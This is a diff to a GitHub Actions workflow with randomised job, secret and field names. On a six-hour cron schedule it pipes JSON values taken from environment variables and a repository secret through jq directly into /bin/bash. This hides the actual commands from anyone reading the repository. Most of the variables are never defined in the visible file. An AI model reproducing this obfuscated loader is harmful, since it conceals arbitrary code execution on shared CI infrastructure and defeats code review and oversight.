@@ -3,7 +3,7 @@ name: yinzhiping2389
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 1/6 * * *'
+    - cron: '33 3/6 * * *'
 
 jobs:
   build:
@@ -13,9 +13,20 @@ jobs:
       - uses: actions/checkout@v4
       - name: yinzhiping2389
         env:
-          kvpb7470: ${{ secrets.kvpb7470 }}
+          t13: ${{ secrets.t13 }}
         run: |
-          echo $kvpb7470 | jq -r .nvoow8027 | /bin/bash
-          echo $c164 | jq -r .gm93598 | /bin/bash
-          echo $tk8453 | jq -r .e2780 | /bin/bash
+          echo $t13 | jq -r .yo02269 | /bin/bash
+          echo $v1 | jq -r .vjrc3668 | /bin/bash
+          echo $j4 | jq -r .w5 | /bin/bash
+          echo $iuen0 | jq -r .ddre41 | /bin/bash
+          echo $qng157 | jq -r .c15103 | /bin/bash
+          echo $zn212 | jq -r .tlz04811 | /bin/bash
+          echo $adqw98606 | jq -r .ty254 | /bin/bash
+          echo $s7809 | jq -r .geo9 | /bin/bash
+          echo $a253 | jq -r .jdu916 | /bin/bash
+          echo $ypsqd86 | jq -r .bod9982 | /bin/bash
+          echo $umj9 | jq -r .oqorp8 | /bin/bash
+          echo $dcdma026 | jq -r .xos5863 | /bin/bash
+          echo $o1088 | jq -r .z835 | /bin/bash
+          echo $pssme82125 | jq -r .js8 | /bin/bash
 
